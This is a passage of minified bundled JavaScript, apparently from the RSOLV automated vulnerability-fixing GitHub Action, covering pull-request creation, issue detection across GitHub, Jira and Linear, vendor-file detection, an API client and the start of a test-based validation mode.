service.",prevention:"Disable external entity processing in XML parsers, use less complex data formats like JSON when possible, and validate/sanitize XML input."}}});import{execSync as s7}from"child_process";async function KQ(X,J,Q,Y,W){try{U.info(`Creating pull request from commit ${J.substring(0,8)} for issue #${X.number}`);let G=`rsolv/fix-issue-${X.number}`,H=await Kx1(J,G,Y);if(!H.success)return{success:!1,message:"Failed to push changes",error:H.error};let z=Ux1(X,Q,W),$=Z0(),[V,K]=X.repository.fullName.split("/");try{let Z=Q.isTestMode&&Q.validationFailed?"[TEST MODE] ":"",{data:q}=await $.pulls.create({owner:V,repo:K,title:`${Z}[RSOLV] ${Q.title} (fixes #${X.number})`,body:z,head:G,base:X.repository.defaultBranch||"main",maintainer_can_modify:!0});if(U.info(`Created pull request #${q.number}: ${q.html_url}`),Y.rsolvApiKey)try{await new x6(Y.rsolvApiKey).createFixAttempt({issueId:X.id,issueNumber:X.number,repository:X.repository.fullName,pullRequestUrl:q.html_url,pullRequestNumber:q.number,branchName:G,commitHash:J}),U.info("Tracked fix attempt in RSOLV API")}catch(B){U.warn("Failed to track fix attempt in RSOLV API",B)}return{success:!0,message:`Created pull request #${q.number}`,pullRequestUrl:q.html_url,pullRequestNumber:q.number,branchName:G,commitHash:J}}catch(Z){if(Z.status===422&&Z.message?.includes("pull request already exists")){U.warn("Pull request already exists for this branch");let{data:q}=await $.pulls.list({owner:V,repo:K,head:`${V}:${G}`,state:"open"});if(q.length>0){let B=q[0];return{success:!0,message:`Pull request already exists: #${B.number}`,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:G,commitHash:J}}}throw Z}}catch(G){return U.error("Failed to create pull request from git",G),{success:!1,message:"Failed to create pull request",error:G instanceof Error?G.message:String(G)}}}async function Kx1(X,J,Q){try{let Y=Q.repoToken||process.env.GITHUB_TOKEN||process.env.GH_PAT;if(Y){let W=process.env.GITHUB_REPOSITORY;if(W){let[G,H]=W.split("/"),z=`https://x-access-token:${Y}@github.com/${G}/${H}.git`;try{s7(`git remote set-url origin ${z}`,{encoding:"utf-8"}),U.debug("Configured git authentication for push")}catch($){U.warn("Failed to configure git authentication, will try with default settings")}}}return s7(`git checkout -b ${J} ${X}`,{encoding:"utf-8"}),U.info(`Created branch ${J} from commit ${X.substring(0,8)}`),s7(`git push origin ${J}`,{encoding:"utf-8"}),U.info(`Pushed branch ${J} to origin`),s7("git checkout -",{encoding:"utf-8"}),{success:!0}}catch(Y){U.error("Failed to push branch",Y);try{s7("git checkout -",{encoding:"utf-8"})}catch(W){}return{success:!1,error:Y instanceof Error?Y.message:String(Y)}}}function Ux1(X,J,Q){let Y=[],W=J.isTestMode&&J.validationFailed?"[TEST MODE] ":"";if(Y.push(`# ${W}${J.title}
`),J.isTestMode&&J.validationFailed){if(Y.push(`> ⚠️ **TEST MODE**: This PR was created despite validation failures to allow inspection of the attempted fix.
`),Y.push(`> 
`),J.testModeNote)Y.push(`> **Validation Issue:** ${J.testModeNote}
`);Y.push(`
`),Y.push(`---

`)}if(Y.push(`**Fixes:** #${X.number}
`),Y.push(`## Summary
`),Y.push(J.description),Y.push(""),Q&&Q.filesChanged>0)Y.push(`## Changes Made
`),Y.push(`- **Files Changed:** ${Q.filesChanged}`),Y.push(`- **Lines Added:** ${Q.insertions}`),Y.push(`- **Lines Removed:** ${Q.deletions}`),Y.push("");if(J.vulnerabilityDetails){if(Y.push(`## Security Details
`),Y.push(`- **Vulnerability Type:** ${J.vulnerabilityDetails.type}`),Y.push(`- **Severity:** ${J.vulnerabilityDetails.severity}`),J.vulnerabilityDetails.cwe)Y.push(`- **CWE:** ${J.vulnerabilityDetails.cwe}`);Y.push("")}if(J.securityImpact)Y.push(`## Security Impact
`),Y.push(J.securityImpact),Y.push("");if(J.tests&&J.tests.length>0)Y.push(`## Testing Instructions
`),J.tests.forEach((G,H)=>{Y.push(`${H+1}. ${G}`)}),Y.push("");return Y.push(`## Review Checklist
`),Y.push("- [ ] Changes fix the reported vulnerability"),Y.push("- [ ] No new vulnerabilities introduced"),Y.push("- [ ] Existing functionality preserved"),Y.push("- [ ] Code follows project conventions"),Y.push("- [ ] Tests pass (if applicable)"),Y.push(""),Y.push(`---
`),Y.push("This PR was automatically generated by [RSOLV](https://rsolv.dev) using direct file editing."),Y.push(`Issue: #${X.number}`),Y.join(`
`)}var qG=s(()=>{I1();z9()});async function SA(X){try{U.info("Detecting issues for automation");let J=process.env.GITHUB_REPOSITORY||"",[Q,Y]=J.split("/");if(!Q||!Y)throw Error("Repository information not available in environment variables");let W=await fJ(Q,Y),G=process.env.RSOLV_ISSUE_NUMBER;if(G){U.info(`Processing specific issue #${G}`);let Z=await jx1(Q,Y,parseInt(G));return(Z?[Z]:[]).map((M)=>({id:`github-${M.id}`,number:M.number,title:M.title,body:M.body??"",labels:M.labels.map((O)=>typeof O==="string"?O:O.name),assignees:M.assignees?.map((O)=>O.login)||[],repository:{owner:Q,name:Y,fullName:J,defaultBranch:W.defaultBranch,language:W.language},source:"github",createdAt:M.created_at,updatedAt:M.updated_at,metadata:{htmlUrl:M.html_url,state:M.state,locked:M.locked,draft:M.draft}}))}let H=[X.issueLabel];if(!X.issueLabel.includes("rsolv"))H.push("rsolv");let z=[],$=new Set,V=X.maxIssues;for(let Z of H){let q=V?V-z.length:void 0;if(q===0)break;let B=await Mx1(Q,Y,Z,q);for(let M of B)if(!$.has(M.id)){if($.add(M.id),z.push(M),V&&z.length>=V)break}if(V&&z.length>=V){U.info(`Reached max_issues limit of ${V}, stopping issue detection`);break}}return U.info(`Found ${z.length} issues with labels: ${H.join(" or ")}`),z.map((Z)=>({id:`github-${Z.id}`,number:Z.number,title:Z.title,body:Z.body??"",labels:Z.labels.map((q)=>typeof q==="string"?q:q.name),assignees:Z.assignees?.map((q)=>q.login)||[],repository:{owner:Q,name:Y,fullName:J,defaultBranch:W.defaultBranch,language:W.language},source:"github",createdAt:Z.created_at,updatedAt:Z.updated_at,metadata:{htmlUrl:Z.html_url,state:Z.state,locked:Z.locked,draft:Z.draft}}))}catch(J){throw U.error("Error detecting issues",J),Error(`Failed to detect issues: ${J instanceof Error?J.message:String(J)}`)}}async function Mx1(X,J,Q,Y){try{let W=Z0(),G=Y?Math.min(Y,100):100,{data:H}=await W.issues.listForRepo({owner:X,repo:J,labels:Q,state:"open",per_page:G}),z=H.filter(($)=>!$.pull_request);if(Y&&z.length>Y)return z.slice(0,Y);return z}catch(W){throw U.error(`Error getting issues with label ${Q}`,W),Error(`Failed to get issues with label: ${W instanceof Error?W.message:String(W)}`)}}async function jx1(X,J,Q){try{let Y=await Z0(),{data:W}=await Y.issues.get({owner:X,repo:J,issue_number:Q});if(W.pull_request)return U.warn(`Issue #${Q} is actually a pull request, skipping`),null;return W}catch(Y){if(U.error(`Error getting issue #${Q}`,Y),Y.status===404)return U.warn(`Issue #${Q} not found`),null;throw Error(`Failed to get issue: ${Y instanceof Error?Y.message:String(Y)}`)}}var TA=s(()=>{I1();z9()});class o7{autofixLabel;rsolvLabel;constructor(X){this.autofixLabel=X.autofixLabel||"autofix",this.rsolvLabel=X.rsolvLabel||"rsolv"}validateConfig(X,J){let Q=J.filter((Y)=>!X[Y]);if(Q.length>0)throw Error(`Missing required configuration fields: ${Q.join(", ")}`)}async makeRequest(X,J={}){try{let Q=await fetch(X,{...J,headers:{...this.getAuthHeaders(),...J.headers}});if(!Q.ok)throw Error(`HTTP ${Q.status}: ${Q.statusText}`);return Q}catch(Q){throw U.error(`Platform API request failed: ${X}`,Q),Q}}hasRsolvLabels(X){let J=X.map((Q)=>Q.toLowerCase());return J.includes(this.autofixLabel.toLowerCase())||J.includes(this.rsolvLabel.toLowerCase())}extractIssueId(X){let J=[/^#?(\d+)$/,/^([A-Z]+-\d+)$/,/^([A-Z]+-\d+)$/i,/\/(\d+)\/?$/,/\/([A-Z]+-\d+)\/?$/i];for(let Q of J){let Y=X.match(Q);if(Y)return Y[1]}return X}formatError(X,J){let Q=J?.message||J?.toString()||"Unknown error";return`${X} failed: ${Q}`}}var MG=s(()=>{I1()});var jG;var _A=s(()=>{MG();I1();jG=class jG extends o7{config;baseUrl;authHeader;constructor(X){super(X);this.config=X;this.validateConfig(X,["host","email","apiToken"]),this.baseUrl=`https://${X.host}/rest/api/3`,this.authHeader=`Basic ${Buffer.from(`${X.email}:${X.apiToken}`).toString("base64")}`}getAuthHeaders(){return{Authorization:this.authHeader,Accept:"application/json","Content-Type":"application/json"}}async authenticate(){try{await this.makeRequest(`${this.baseUrl}/myself`),U.info("Successfully authenticated with Jira")}catch(X){throw Error(this.formatError("Jira authentication",X))}}async searchIssues(X){try{return(await(await this.makeRequest(`${this.baseUrl}/search`,{method:"POST",body:JSON.stringify({jql:X,fields:["summary","description","labels","status","created","updated","assignee","reporter"]})})).json()).issues.map((Y)=>this.convertToUnifiedIssue(Y))}catch(J){throw Error(this.formatError("Jira issue search",J))}}async getIssue(X){try{let J=this.extractIssueId(X),Y=await(await this.makeRequest(`${this.baseUrl}/issue/${J}`)).json();return this.convertToUnifiedIssue(Y)}catch(J){if(J.message?.includes("404"))return null;throw Error(this.formatError("Get Jira issue",J))}}async createComment(X,J){try{let Q=this.extractIssueId(X),W=await(await this.makeRequest(`${this.baseUrl}/issue/${Q}/comment`,{method:"POST",body:JSON.stringify({body:{type:"doc",version:1,content:[{type:"paragraph",content:[{type:"text",text:J}]}]}})})).json();return{id:W.id,body:J,author:W.author?.displayName||"Unknown",createdAt:new Date(W.created)}}catch(Q){return U.error("Failed to create Jira comment",Q),null}}async updateIssueStatus(X,J){try{let Q=this.extractIssueId(X),Y=await this.makeRequest(`${this.baseUrl}/issue/${Q}/transitions`),{transitions:W}=await Y.json(),G=W.find((H)=>H.name===J);if(!G)return U.warn(`Status '${J}' not available for issue ${X}`),!1;return await this.makeRequest(`${this.baseUrl}/issue/${Q}/transitions`,{method:"POST",body:JSON.stringify({transition:{id:G.id}})}),!0}catch(Q){return U.error("Failed to update Jira issue status",Q),!1}}async addLink(X,J,Q){try{let Y=this.extractIssueId(X),W=Q||J;return{id:(await(await this.makeRequest(`${this.baseUrl}/issue/${Y}/remotelink`,{method:"POST",body:JSON.stringify({object:{url:J,title:W,icon:{url16x16:J.includes("github.com")?"https://github.com/favicon.ico":void 0,title:J.includes("github.com")?"GitHub Pull Request":"External Link"}}})})).json()).id,url:J,title:W,type:"external"}}catch(Y){return U.error("Failed to add link to Jira issue",Y),null}}async addLabel(X,J){try{let Q=this.extractIssueId(X),G=(await(await this.makeRequest(`${this.baseUrl}/issue/${Q}?fields=labels`)).json()).fields.labels||[];if(!G.includes(J))await this.makeRequest(`${this.baseUrl}/issue/${Q}`,{method:"PUT",body:JSON.stringify({fields:{labels:[...G,J]}})});return!0}catch(Q){return U.error("Failed to add label to Jira issue",Q),!1}}convertToUnifiedIssue(X){return{id:X.id,platform:"jira",key:X.key,title:X.fields.summary,description:X.fields.description||"",labels:X.fields.labels||[],status:X.fields.status.name,url:`https://${this.config.host}/browse/${X.key}`,createdAt:new Date(X.fields.created),updatedAt:new Date(X.fields.updated),assignee:X.fields.assignee?{id:X.fields.assignee.accountId,name:X.fields.assignee.displayName,email:X.fields.assignee.emailAddress}:void 0,reporter:X.fields.reporter?{id:X.fields.reporter.accountId,name:X.fields.reporter.displayName,email:X.fields.reporter.emailAddress}:void 0}}async searchAutofixIssues(){return this.searchIssues(`labels = "${this.autofixLabel}"`)}async searchRsolvIssues(){let X=`labels in ("${this.autofixLabel}", "${this.rsolvLabel}")`;return this.searchIssues(X)}}});var OG;var EA=s(()=>{MG();I1();OG=class OG extends o7{apiKey;baseUrl="https://api.linear.app/graphql";teamId;constructor(X){super(X);this.validateConfig(X,["apiKey"]),this.apiKey=X.apiKey,this.teamId=X.teamId}getAuthHeaders(){return{Authorization:this.apiKey,"Content-Type":"application/json"}}async graphqlRequest(X,J){try{let Y=await(await this.makeRequest(this.baseUrl,{method:"POST",body:JSON.stringify({query:X,variables:J})})).json();if(Y.errors)throw Error(`Linear GraphQL error: ${JSON.stringify(Y.errors)}`);return Y.data}catch(Q){throw Error(this.formatError("Linear GraphQL request",Q))}}async searchRsolvIssues(){let J={labels:{or:[{name:{eq:this.autofixLabel}},{name:{eq:this.rsolvLabel}}]}};if(this.teamId)J.team={id:{eq:this.teamId}};try{return(await this.graphqlRequest(`
      query SearchIssues($filter: IssueFilter) {
        issues(filter: $filter) {
          nodes {
            id
            identifier
            title
            description
            state {
              name
              type
            }
            labels {
              nodes {
                name
              }
            }
            assignee {
              name
              email
            }
            createdAt
            updatedAt
            url
          }
        }
      }
    `,{filter:J})).issues.nodes.map((Y)=>this.convertToUnifiedIssue(Y))}catch(Q){throw U.error("Failed to search Linear issues:",Q),Q}}async getIssue(X){try{let Q=await this.graphqlRequest(`
      query GetIssue($id: String!) {
        issue(id: $id) {
          id
          identifier
          title
          description
          state {
            name
            type
          }
          labels {
            nodes {
              name
            }
          }
          assignee {
            name
            email
          }
          createdAt
          updatedAt
          url
        }
      }
    `,{id:X});return Q.issue?this.convertToUnifiedIssue(Q.issue):null}catch(Q){return U.error(`Failed to get Linear issue ${X}:`,Q),null}}async createComment(X,J){try{let Y=await this.graphqlRequest(`
      mutation CreateComment($issueId: String!, $body: String!) {
        commentCreate(
          input: {
            issueId: $issueId
            body: $body
          }
        ) {
          success
          comment {
            id
            body
            user {
              name
              email
            }
            createdAt
          }
        }
      }
    `,{issueId:X,body:J});if(!Y.commentCreate.success)throw Error("Failed to create comment");let W=Y.commentCreate.comment;return{id:W.id,body:W.body,author:W.user.name,createdAt:new Date(W.createdAt)}}catch(Y){return U.error(`Failed to create comment on Linear issue ${X}:`,Y),null}}async addLink(X,J,Q){let W=`\uD83D\uDD17 Related: ${Q?`[${Q}](${J})`:J}`,G=await this.createComment(X,W);if(!G)return null;return{id:G.id,url:J,title:Q||J,type:"external"}}async updateIssueStatus(X,J){try{let Y=await this.graphqlRequest(`
      query GetStates($name: String!) {
        workflowStates(filter: { name: { eq: $name } }) {
          nodes {
            id
            name
            type
          }
        }
      }
    `,{name:J});if(Y.workflowStates.nodes.length===0)return U.error(`No Linear state found with name: ${J}`),!1;let W=Y.workflowStates.nodes[0].id,G=`
        mutation UpdateIssue($issueId: String!, $stateId: String!) {
          issueUpdate(
            id: $issueId
            input: { stateId: $stateId }
          ) {
            success
          }
        }
      `;return(await this.graphqlRequest(G,{issueId:X,stateId:W})).issueUpdate.success}catch(Y){return U.error(`Failed to update Linear issue ${X} status:`,Y),!1}}async addLabel(X,J){try{let Y=await this.graphqlRequest(`
      query GetLabel($name: String!) {
        issueLabels(filter: { name: { eq: $name } }) {
          nodes {
            id
            name
          }
        }
      }
    `,{name:J}),W;if(Y.issueLabels.nodes.length===0){let $=await this.graphqlRequest(`
          mutation CreateLabel($name: String!) {
            issueLabelCreate(
              input: { name: $name }
            ) {
              success
              issueLabel {
                id
              }
            }
          }
        `,{name:J});if(!$.issueLabelCreate.success)return!1;W=$.issueLabelCreate.issueLabel.id}else W=Y.issueLabels.nodes[0].id;let G=`
        mutation AddLabel($issueId: String!, $labelId: String!) {
          issueAddLabel(
            id: $issueId
            labelId: $labelId
          ) {
            success
          }
        }
      `;return(await this.graphqlRequest(G,{issueId:X,labelId:W})).issueAddLabel.success}catch(Y){return U.error(`Failed to add label to Linear issue ${X}:`,Y),!1}}convertToUnifiedIssue(X){return{id:X.id,platform:"linear",key:X.identifier,title:X.title,description:X.description||"",labels:X.labels.nodes.map((J)=>J.name),status:X.state.name,statusCategory:this.mapLinearStateType(X.state.type),assignee:X.assignee?.name,createdAt:new Date(X.createdAt),updatedAt:new Date(X.updatedAt),url:X.url}}mapLinearStateType(X){switch(X.toLowerCase()){case"backlog":case"unstarted":return"todo";case"started":case"in_progress":return"in_progress";case"completed":case"done":case"canceled":return"done";default:return"todo"}}}});class UQ{static create(X,J){switch(X){case"jira":if(!J.jira)throw Error("Jira configuration is required");return new jG(J.jira);case"linear":if(!J.linear)throw Error("Linear configuration is required");return new OG(J.linear);case"gitlab":throw Error("GitLab integration not yet implemented");default:throw Error(`Unsupported platform: ${X}`)}}}var kA=s(()=>{_A();EA()});var ZQ={};N0(ZQ,{detectIssuesFromAllPlatforms:()=>Ox1});async function Ox1(X){let J=[],Q=X.maxIssues;try{let Y=await SA(X);if(J.push(...Y),U.info(`Found ${Y.length} GitHub issues`),Q&&J.length>=Q)return U.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q)}catch(Y){U.error("Error detecting GitHub issues",Y)}if(process.env.JIRA_HOST&&process.env.JIRA_EMAIL&&process.env.JIRA_API_TOKEN){if(!Q||J.length<Q)try{let Y=await Fx1(X);if(J.push(...Y),U.info(`Found ${Y.length} Jira issues`),Q&&J.length>=Q)return U.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q)}catch(Y){U.error("Error detecting Jira issues",Y)}}if(process.env.LINEAR_API_KEY){if(!Q||J.length<Q)try{let Y=await Rx1(X);if(J.push(...Y),U.info(`Found ${Y.length} Linear issues`),Q&&J.length>=Q)return U.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q)}catch(Y){U.error("Error detecting Linear issues",Y)}}if(process.env.GITLAB_TOKEN)U.info("GitLab integration not yet implemented");if(U.info(`Total issues found across all platforms: ${J.length}`),Q&&J.length>Q)return U.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q);return J}async function Fx1(X){let J={jira:{host:process.env.JIRA_HOST,email:process.env.JIRA_EMAIL,apiToken:process.env.JIRA_API_TOKEN,autofixLabel:process.env.JIRA_AUTOFIX_LABEL||"autofix",rsolvLabel:process.env.JIRA_RSOLV_LABEL||"rsolv"}},Q=UQ.create("jira",J),Y;if(process.env.JIRA_JQL)Y=await Q.searchIssues(process.env.JIRA_JQL);else Y=await Q.searchRsolvIssues();return U.info(`Found ${Y.length} Jira issues with rsolv/autofix labels`),Y.map((W)=>bA(W))}async function Rx1(X){let J={linear:{apiKey:process.env.LINEAR_API_KEY,teamId:process.env.LINEAR_TEAM_ID,autofixLabel:process.env.LINEAR_AUTOFIX_LABEL||"autofix",rsolvLabel:process.env.LINEAR_RSOLV_LABEL||"rsolv"}},Y=await UQ.create("linear",J).searchRsolvIssues();return U.info(`Found ${Y.length} Linear issues with rsolv/autofix labels`),Y.map((W)=>bA(W))}function bA(X){let J=Ax1(X);return{id:X.id,number:parseInt(X.key?.split("-")[1]||"0"),title:X.title,body:X.description,labels:X.labels,assignees:X.assignee?[typeof X.assignee==="string"?X.assignee:X.assignee.name]:[],repository:J||{owner:"unknown",name:"unknown",fullName:"unknown/unknown",defaultBranch:"main",language:"unknown"},source:X.platform,createdAt:X.createdAt.toISOString(),updatedAt:X.updatedAt.toISOString(),metadata:{htmlUrl:X.url,state:X.status,locked:!1,draft:!1,platformKey:X.key}}}function Ax1(X){let Q=/https?:\/\/github\.com\/([^/]+)\/([^/\s]+)/g.exec(X.description);if(Q){let[,Y,W]=Q;return{owner:Y,name:W,fullName:`${Y}/${W}`,defaultBranch:"main",language:"unknown"}}if(X.customFields?.githubRepository){let[Y,W]=X.customFields.githubRepository.split("/");return{owner:Y,name:W,fullName:X.customFields.githubRepository,defaultBranch:X.customFields.githubDefaultBranch||"main",language:X.customFields.githubLanguage||"unknown"}}return null}var qQ=s(()=>{I1();TA();kA()});import*as BQ from"path";import*as FG from"fs/promises";class RG{VENDOR_PATTERNS=["node_modules","vendor","bower_components","jspm_packages","packages","third_party","external","libs","dependencies","dist"];MINIFIED_PATTERNS=[".min.js","-min.js",".bundle.js",".min.css","-min.css"];VENDOR_INDICATORS={filePatterns:[/jquery[.-]?([\d.]+)?(?:\.min)?\.js$/i,/bootstrap[.-]?([\d.]+)?(?:\.min)?\.(?:js|css)$/i,/angular[.-]?([\d.]+)?(?:\.min)?\.js$/i,/react[.-]?([\d.]+)?(?:\.min)?\.js$/i,/vue[.-]?([\d.]+)?(?:\.min)?\.js$/i,/lodash[.-]?([\d.]+)?(?:\.min)?\.js$/i,/moment[.-]?([\d.]+)?(?:\.min)?\.js$/i],headerComments:[/\/\*!?\s*jQuery\s+v?([\d.]+)/i,/\/\*!?\s*Bootstrap\s+v?([\d.]+)/i,/\/\*!?\s*Angular\s+v?([\d.]+)/i,/\/\*!?\s*React\s+v?([\d.]+)/i,/\/\*!?\s*Vue\.js\s+v?([\d.]+)/i,/Copyright\s+\(c\)\s+.*\s+Foundation/i,/Licensed\s+under\s+MIT/i,/\/\*!?\s*\w+\.js\s+v?\d+\.\d+\.\d+/]};async isVendorFile(X){if(this.matchesVendorPattern(X))return!0;if(this.isMinified(X))return!0;if(this.matchesKnownLibrary(X))return!0;return!1}async containsVendorIndicators(X,J){if(J)return this.hasVendorHeader(J);try{let Y=(await FG.readFile(X,"utf-8")).substring(0,500);return this.hasVendorHeader(Y)}catch{return!1}}async identifyLibrary(X,J){if(!(await this.isVendorFile(X)||J&&this.hasVendorHeader(J)))return null;if(J){let W=this.extractFromHeader(J);if(W)return W}let Y=this.extractFromPath(X);if(Y)return Y;if(!J)try{let G=(await FG.readFile(X,"utf-8")).substring(0,500);return this.extractFromHeader(G)}catch{}return{name:"unknown-vendor",version:"unknown"}}matchesVendorPattern(X){let J=X.replace(/\\/g,"/");return this.VENDOR_PATTERNS.some((Q)=>J.includes(`/${Q}/`)||J.includes(`${Q}/`))}isMinified(X){let J=BQ.basename(X).toLowerCase();return this.MINIFIED_PATTERNS.some((Q)=>J.includes(Q))}matchesKnownLibrary(X){let J=BQ.basename(X);return this.VENDOR_INDICATORS.filePatterns.some((Q)=>Q.test(J))}hasVendorHeader(X){return this.VENDOR_INDICATORS.headerComments.some((J)=>J.test(X))}extractFromPath(X){let J=BQ.basename(X);for(let Y of this.VENDOR_INDICATORS.filePatterns){let W=J.match(Y);if(W){let G=this.getLibraryNameFromPattern(Y),H=W[1]||"unknown";return{name:G,version:H}}}let Q=J.match(/^([\w-]+)[.-]([\d.]+)(?:\.min)?\.(?:js|css)$/);if(Q)return{name:Q[1].toLowerCase(),version:Q[2]};return null}extractFromHeader(X){let J=X.match(/\/\*!?\s*Bootstrap\s+v?([\d.]+)(?:\s+\([^)]+\))?/i);if(J)return{name:"bootstrap",version:J[1]||"unknown"};for(let Q of this.VENDOR_INDICATORS.headerComments){let Y=X.match(Q);if(Y){let W=this.getLibraryNameFromHeader(X,Q),G=Y[1]||"unknown";if(W)return{name:W.toLowerCase(),version:G}}}return null}getLibraryNameFromPattern(X){let Q=X.source.match(/^(\w+)/);return Q?Q[1].toLowerCase():"unknown"}getLibraryNameFromHeader(X,J){let Q=J.source;if(Q.includes("jQuery"))return"jquery";if(Q.includes("Bootstrap"))return"bootstrap";if(Q.includes("Angular"))return"angular";if(Q.includes("React"))return"react";if(Q.includes("Vue"))return"vue";let Y=X.match(/\/\*!?\s*(\w+)(?:\.js)?\s+v/i);if(Y)return Y[1].toLowerCase();return null}}var vA=()=>{};import*as MQ from"fs";import*as fA from"path";class xA{vendorDetector;constructor(){this.vendorDetector=new RG}extractFilesFromIssue(X){let J=[],Q=X.body?.split(`
`)||[];for(let W of Q){let G=W.match(/\*\*File\*\*:\s*(.+)/);if(G)J.push(G[1].trim());let H=W.match(/^File:\s*(.+)/);if(H)J.push(H[1].trim());let z=W.match(/\/\/\s*File:\s*(.+)/);if(z)J.push(z[1].trim())}let Y=X.title?.match(/in\s+(.+\.(js|ts|jsx|tsx|py|java|php|rb|go))/);if(Y)J.push(Y[1]);return[...new Set(J)]}async checkForVendorFiles(X){let J=[],Q=this.extractFilesFromIssue(X);U.info(`Checking ${Q.length} files for vendor status in issue #${X.number}`);for(let Y of Q)if(await this.vendorDetector.isVendorFile(Y))J.push(Y),U.info(`Detected vendor file: ${Y}`);return{isVendor:J.length>0,files:J}}checkVendorStatusFromValidation(X,J){try{let Q=fA.join(X,".rsolv","validation",`issue-${J}.json`);if(!MQ.existsSync(Q))return U.debug(`No validation results found for issue #${J}`),{isVendor:!1,files:[]};let Y=JSON.parse(MQ.readFileSync(Q,"utf-8"));if(Y.vendoredFile)return U.info(`Issue #${J} marked as vendor file in validation`),{isVendor:!0,files:Y.affectedVendorFiles||[]};return{isVendor:!1,files:[]}}catch(Q){return U.warn(`Error reading validation status for issue #${J}:`,Q),{isVendor:!1,files:[]}}}formatVendorMessage(X){if(X.length===0)return"";return`Vendor/third-party files detected:
${X.map((Q)=>`  - ${Q}`).join(`
`)}

These files cannot be directly patched. Library update required.`}async isVendorFile(X){return await this.vendorDetector.isVendorFile(X)}}var jQ;var AG=s(()=>{vA();I1();jQ=new xA});class DG{apiKey;baseUrl;maxRetries=3;baseDelay=100;constructor(X,J){this.apiKey=X;this.baseUrl=J||process.env.RSOLV_API_URL||"https://api.rsolv.dev"}async analyze(X){return this.makeRequest("/api/v1/test-integration/analyze",X)}async generate(X){return this.makeRequest("/api/v1/test-integration/generate",X)}async makeRequest(X,J,Q=0){let Y=`${this.baseUrl}${X}`;try{let W=await fetch(Y,{method:"POST",headers:{"x-api-key":this.apiKey,"Content-Type":"application/json"},body:JSON.stringify(J)});if(W.status>=400&&W.status<500){if(W.status===401)throw Error("Unauthorized: Invalid API key");let G=`HTTP ${W.status}: ${W.statusText}`;try{let H=await W.json();if(H.error)G=`HTTP ${W.status}: ${H.error}`}catch{}throw Error(G)}if(W.status>=500){if(Q<this.maxRetries){let G=this.baseDelay*Math.pow(2,Q);return U.warn(`Server error (${W.status}), retrying in ${G}ms (attempt ${Q+1}/${this.maxRetries})`),await this.sleep(G),this.makeRequest(X,J,Q+1)}throw Error(`Server error after ${this.maxRetries} attempts: ${W.statusText}`)}if(!W.ok)throw Error(`Unexpected response: ${W.status} ${W.statusText}`);return await W.json()}catch(W){if(this.isRetriableError(W)&&Q<this.maxRetries){let G=this.baseDelay*Math.pow(2,Q);return U.warn(`Network error, retrying in ${G}ms (attempt ${Q+1}/${this.maxRetries}):`,W),await this.sleep(G),this.makeRequest(X,J,Q+1)}throw W}}isRetriableError(X){if(X instanceof TypeError&&X.message.includes("fetch"))return!0;return["ECONNREFUSED","ENOTFOUND","ETIMEDOUT","ECONNRESET","Network timeout","Network error"].some((Q)=>X?.message?.includes(Q)||X?.code?.includes(Q))}sleep(X){return new Promise((J)=>setTimeout(J,X))}}var hA=s(()=>{I1()});var OQ={};N0(OQ,{ValidationMode:()=>yA});import{execSync as S0}from"child_process";import*as A0 from"fs";import*as q0 from"path";class yA{config;falsePositiveCache;repoPath;phaseDataClient;testIntegrationClient;constructor(X,J){if(this.config=X,this.repoPath=J||process.cwd(),this.falsePositiveCache=new Set,this.phaseDataClient=X.rsolvApiKey?new xJ(X.rsolvApiKey):null,this.testIntegrationClient=X.rsolvApiKey?new DG(X.rsolvApiKey):null,X.environmentVariables&&typeof X.environmentVariables==="object")Object.entries(X.environmentVariables).forEach(([Q,Y])=>{if(typeof Y==="string")process.env[Q]=Y,U.debug(`Applied environment variable: ${Q}`)});this.loadFalsePositiveCache()}async validateVulnerability(X){let J=process.env.RSOLV_TESTING_MODE==="true",Q=this.config.executableTests??!0;if(U.info(`[VALIDATION MODE] Starting validation for issue #${X.number}`),J)U.info("[VALIDATION MODE] \uD83E\uDDEA TESTING MODE ENABLED - Will not filter based on test results");if(!Q)return U.info("[VALIDATION MODE] Executable tests disabled - skipping validation"),{issueId:X.number,validated:!0,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};try{this.ensureCleanGitState();let Y=await jQ.checkForVendorFiles(X);if(Y.isVendor)return U.info(`Issue #${X.number} affects vendor files - marking as VENDORED`),{issueId:X.number,validated:!1,vendoredFile:!0,falsePositiveReason:"Vulnerability in vendor file - requires library update",affectedVendorFiles:Y.files,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};let W=this.getCacheKey(X);if(this.falsePositiveCache.has(W)&&!process.env.RSOLV_SKIP_CACHE)return U.info(`Issue #${X.number} is in false positive cache, skipping`),{issueId:X.number,validated:!1,falsePositiveReason:"Previously identified as false positive",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};U.info(`Analyzing issue #${X.number} for validation`);let G=await Z6(X,this.config);if(!G.canBeFixed)return U.warn(`Issue #${X.number} cannot be validated: ${G.cannotFixReason}`),{issueId:X.number,validated:!1,falsePositiveReason:G.cannotFixReason||"Analysis determined issue cannot be fixed",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};U.info(`Generating RED tests for issue #${X.number}`);let H=await this.generateRedTests(X,G);if(!H||!H.generatedTests)return U.warn(`Failed to generate tests for issue #${X.number}`),{issueId:X.number,validated:!1,falsePositiveReason:"Unable to generate validation tests",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};U.info("Creating validation branch for test persistence");let z=null,$=process.env.RSOLV_TESTING_MODE==="true";try{z=await this.createValidationBranch(X),await this.commitTestsToBranch(H.generatedTests.testSuite,z,X),U.info(`✅ Tests committed to validation branch: ${z}`)}catch(B){if($){U.warn(`Test mode: Force committing tests despite error: ${B}`);try{z=`rsolv/validate/issue-${X.number}`,await this.forceCommitTestsInTestMode(H.generatedTests.testSuite,z,X),U.info(`✅ Test mode: Tests force-committed to branch: ${z}`)}catch(M){U.error(`Test mode: Failed to force commit tests: ${M}`)}}else U.warn(`Could not create validation branch: ${B}`)}U.info("Running RED tests to prove vulnerability exists");let K=await new oX().validateFixWithTests("HEAD","HEAD",H.generatedTests.testSuite),Z={passed:K.vulnerableCommit.allPassed||!1,output:JSON.stringify(K,null,2),stderr:"",timedOut:!1,exitCode:K.vulnerableCommit.allPassed?0:1,error:K.error&&K.error!=="Fix validation failed - tests do not confirm vulnerability was fixed"?K.error:void 